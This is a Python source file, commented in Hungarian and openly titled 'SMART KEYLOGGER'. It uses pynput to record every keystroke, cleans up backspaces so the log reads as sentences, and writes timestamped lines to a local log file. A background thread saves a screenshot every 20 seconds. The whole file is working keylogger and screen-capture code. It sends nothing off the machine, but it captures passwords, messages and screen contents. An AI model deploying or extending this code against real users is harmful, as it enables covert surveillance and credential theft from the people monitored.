from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import threading
import time
import os

# --- KONFIGURÁCIÓ ---
LOG_FILE = "smart_log.txt"  # Új fájlnév, hogy lásd a különbséget
SCREENSHOT_DIR = "screenshots"
SCREENSHOT_INTERVAL = 20    # Ritkábban fotózunk most

# --- GLOBÁLIS VÁLTOZÓK (A Memória) ---
log_buffer = []  # Itt gyűjtjük a betűket listaként
last_window = ""

if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

def write_to_file():
    """Kiírja a memóriában lévő szöveget a fájlba, majd törli a memóriát."""
    global log_buffer
    if len(log_buffer) == 0:
        return # Nincs mit kiírni

    # Összefűzzük a karaktereket egy stringgé
    sentence = "".join(log_buffer)
    
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        # Szép formátum: [IDŐ] Szöveg
        f.write(f"[{timestamp}] {sentence}\n")
    
    print(f"[LOG] Mentve: {sentence}") # Hogy lásd a konzolon is
    log_buffer = [] # Kiürítjük a buffert

def take_screenshot():
    """A fotós modul (változatlan)."""
    while True:
        time.sleep(SCREENSHOT_INTERVAL)
        try:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            filename = f"{SCREENSHOT_DIR}/screen_{timestamp}.png"
            ImageGrab.grab().save(filename)
            # A képernyőmentést is beírjuk a logba eseményként
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                 f.write(f"[{time.strftime('%H:%M:%S')}] *** KÉPERNYŐFOTÓ KÉSZÜLT: {filename} ***\n")
        except Exception:
            pass

def on_press(key):
    global log_buffer
    
    try:
        # Ha normál betű (a, b, c, 1, 2...)
        if hasattr(key, 'char') and key.char is not None:
            log_buffer.append(key.char)
            
        # --- SPECIÁLIS GOMBOK OKOS KEZELÉSE ---
        elif key == Key.space:
            log_buffer.append(" ")  # Sima szóköz karakter
            
        elif key == Key.enter:
            # Enter lenyomásakor mentjük el a teljes eddigi mondatot!
            write_to_file()
            
        elif key == Key.backspace:
            # Ha töröl, mi is törlünk a memóriából (hogy ne legyen tele hibával a log)
            if len(log_buffer) > 0:
                log_buffer.pop()
                
        # Egyéb speciális gombok (Shift, Ctrl) most nem kellenek a szövegbe
        
    except Exception as e:
        print(f"Hiba: {e}")

def on_release(key):
    if key == Key.esc:
        # Kilépéskor még gyorsan kiírjuk ami a memóriában maradt
        write_to_file()
        return False

# --- INDÍTÁS ---
if __name__ == "__main__":
    print(f"--- 🕵️‍♂️ SMART KEYLOGGER (Readable Logs) ---")
    print(f"[*] Mostantól mondatokat rögzítünk.")
    print(f"[*] Üss ENTER-t a sor rögzítéséhez!")
    
    t = threading.Thread(target=take_screenshot, daemon=True)
    t.start()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()